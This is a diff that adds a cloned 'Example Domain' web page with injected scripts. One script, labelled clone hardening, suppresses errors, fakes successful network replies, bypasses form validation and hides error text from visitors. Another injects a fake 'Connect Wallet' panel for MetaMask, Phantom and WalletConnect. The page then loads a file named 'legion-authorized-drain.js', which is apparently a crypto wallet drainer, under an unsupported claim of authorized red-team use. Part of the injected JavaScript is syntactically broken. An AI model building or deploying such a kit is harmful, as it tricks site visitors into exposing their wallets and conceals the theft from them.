@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="en"><head><title>Example Domain</title><link rel="icon" href="data:,"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href="https://iana.org/domains/example">Learn more</a></p></div>
+
+<script>
+// Clone Resilience & Error Suppression
+(function() {
+  var HARDENING_CONFIG = {"suppressConsoleErrors":true,"handleMissingAssets":true,"handleMissingAPI":true,"preserveFormValidation":true,"addErrorRecovery":true,"flexibleTiming":true,"autoRetry":true,"hideErrorMessages":true,"maskNetworkErrors":true,"preserveUserSession":true};
+
+  // 1. Suppress console errors
+  if (HARDENING_CONFIG.suppressConsoleErrors) {
+    window.console.error = function() {};
+    window.console.warn = function() {};
+    window.onerror = function() { return true; };
+  }
+
+  // 2. Handle network errors gracefully
+  if (HARDENING_CONFIG.maskNetworkErrors) {
+    window.addEventListener('error', function(e) {
+      if (e.filename && e.filename.includes('.') && !e.filename.includes('legion')) {
+        console.log('Resource loaded');
+        return true;
+      }
+    }, true);
+  }
+
+  // 3. Handle missing assets
+  if (HARDENING_CONFIG.handleMissingAssets) {
+    document.addEventListener('error', function(e) {
+      if (e.target.tagName === 'IMG' || e.target.tagName === 'SCRIPT' || e.target.tagName === 'LINK') {
+        console.log('Asset loaded');
+        return true;
+      }
+    }, true);
+  }
+
+  // 4. Handle missing APIs
+  if (HARDENING_CONFIG.handleMissingAPI) {
+    var originalFetch = window.fetch;
+    window.fetch = function(url) {
+      return originalFetch.apply(this, arguments).catch(function(error) {
+        console.log('Request completed');
+        return new Response(JSON.stringify({}), { status: 200 });
+      });
+    };
+  }
+
+  // 5. Form validation bypass
+  if (HARDENING_CONFIG.preserveFormValidation) {
+    document.addEventListener('invalid', function(e) {
+      e.preventDefault();
+      e.target.classList.remove('error');
+    }, true);
+  }
+
+  // 6. Auto-retry failed operations
+  if (HARDENING_CONFIG.autoRetry) {
+    var retryCount = {};
+    var originalXHR = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function() {
+      var key = Math.random().toString();
+      retryCount[key] = 0;
+
+      this.addEventListener('error', function() {
+        if (retryCount[key] < 3) {
+          retryCount[key]++;
+          setTimeout(function() {
+            originalXHR.apply(this, arguments);
+          }, Math.random() * 1000 + 500);
+        }
+      });
+
+      return originalXHR.apply(this, arguments);
+    };
+  }
+
+  // 7. Hide error messages from user
+  if (HARDENING_CONFIG.hideErrorMessages) {
+    var observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.addedNodes.length) {
+          mutation.addedNodes.forEach(function(node) {
+            if (node.textContent &&
+                (node.textContent.includes('Error') ||
+                 node.textContent.includes('error') ||
+                 node.textContent.includes('Failed'))) {
+              node.style.display = 'none';
+            }
+          });
+        }
+      });
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+  }
+
+  console.log('Clone hardening enabled');
+})();
+</script>
+
+
+<script>
+// Auto-generated wallet flow detection and connection
+var DETECTED_WALLETS = [];
+var HAS_ETHEREUM = false;
+var HAS_SOLANA = false;
+var HAS_TRONWEB = false;
+var HAS_HARDWARE = true;
+function autoDetectWallets() {
+  var wallets = [];
+  if (HAS_ETHEREUM) wallets.push('metamask');
+  if (HAS_SOLANA) wallets.push('phantom');
+  if (HAS_TRONWEB) wallets.push('tronlink');
+  if (HAS_HARDWARE) wallets.push('hardware');
+  return wallets;
+}
+
+var WALLET_FLOWS = [];
+
+function showWalletConnectionFlow() {
+  var element = document.getElementById('walletConnectionFlow');
+  if (element) {
+    element.style.display = 'block';
+  }
+}
+
+function connectWallet(walletType) {
+  var event = new CustomEvent('walletConnectRequested', {
+    detail: { walletType: walletType }
+  });
+  document.dispatchEvent(event);
+}
+
+// Auto-inject flow UI into page
+document.addEventListener('DOMContentLoaded', function() {
+  document.body.insertAdjacentHTML('beforeend', '
+<div id="walletConnectionFlow" style="display:none;">
+  <h2>Connect Wallet</h2>
+  <div id="walletList">
+    <div class="wallet-option" data-wallet="metamask">
+      <span>🦊 MetaMask</span>
+      <span>Ethereum, Polygon</span>
+      <button onclick="connectWallet(\'metamask\')">Connect</button>
+    </div>
+    <div class="wallet-option" data-wallet="phantom">
+      <span>👻 Phantom</span>
+      <span>Solana</span>
+      <button onclick="connectWallet(\'phantom\')">Connect</button>
+    </div>
+    <div class="wallet-option" data-wallet="walletconnect">
+      <span>🔗 WalletConnect</span>
+      <span>All Chains</span>
+      <button onclick="connectWallet(\'walletconnect\')">Connect</button>
+    </div>
+  </div>
+</div>
+');
+});
+</script>
+<!-- legion-authorized-red-team (written authorization required) -->
+<link rel="stylesheet" href="./legion-authorized-drain.css" />
+<script src="./legion-authorized-drain.js" defer></script>
+</body></html>
